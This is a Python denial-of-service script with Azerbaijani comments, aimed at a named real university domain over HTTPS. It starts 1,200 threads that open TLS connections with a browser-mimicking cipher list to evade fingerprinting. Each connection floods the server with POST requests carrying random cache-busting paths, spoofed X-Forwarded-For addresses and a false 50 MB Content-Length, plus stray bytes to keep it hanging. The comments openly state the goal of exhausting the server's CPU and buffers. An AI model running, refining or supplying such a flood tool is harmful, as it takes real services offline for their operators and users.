import socket
import ssl
import threading
import random
import string
import time
import os

# --- MAXIMUM DEVASTATION CONFIG ---
TARGET_HOST = "bbu.edu.az" # Bura hədəf domeni yaz
TARGET_PORT = 443
THREADS = 1200 # Railway Paid üçün maksimal şəbəkə sıxlığı

def r_str(n):
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))

def supernova_strike():
    # SSL Handshake-i serveri deşifrə ilə daxildən yormaq üçün mürəkkəb qururuq
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Müasir Chrome brauzerinin şifrələmə sırasını təqlid edirik (JA3 Bypass)
    ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:AES128-GCM-SHA256')

    while True:
        try:
            # TCP bağlantısı - Nagle alqoritmini bypass edirik (Anında zərbə)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)

            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # BATCH STRIKE: Bir bağlantı içində serveri minlərlə yarımçıq paketlə boğmaq
            for _ in range(150):
                # Keşlənməni bypass edən ağır dinamik URL
                path = f"/?v={time.time()}&id={r_str(32)}&q={r_str(60)}"
                ip = f"{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                
                # Bu başlıq serveri hər sorğuda daxili yaddaş (Buffer) ayırmağa məcbur edir
                # Content-Length (50MB) hiləsi ilə serverin prosessorunu (Origin) dondururuq
                payload = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {TARGET_HOST}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(4,6)}.0.0.0\r\n"
                    f"X-Forwarded-For: {ip}\r\n"
                    f"Content-Length: 52428800\r\n" # 50 Megabyte "Yalançı" yük
                    f"Connection: keep-alive\r\n"
                    f"X-Requested-With: XMLHttpRequest\r\n"
                    f"\r\n"
                ).encode()

                conn.sendall(payload)
                # İkinci zərbə: Serveri asılı (Hanging) saxlamaq üçün yarımçıq paketlər
                conn.send(os.urandom(1)) 
            
            # Bağlantını bağlamırıq, timeout olana qədər serverin portunu tuturuq
            time.sleep(1)
            conn.close()
        except:
            pass

def main():
    print(f"☢️  SUPERNOVA PROTOCOL INITIALIZED: {TARGET_HOST}")
    print("[!] Resource Saturation: Targeting Origin CPU and Handshake Buffer.")
    
    for i in range(THREADS):
        t = threading.Thread(target=supernova_strike)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} Protocol Warheads Active...")
            time.sleep(0.5)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
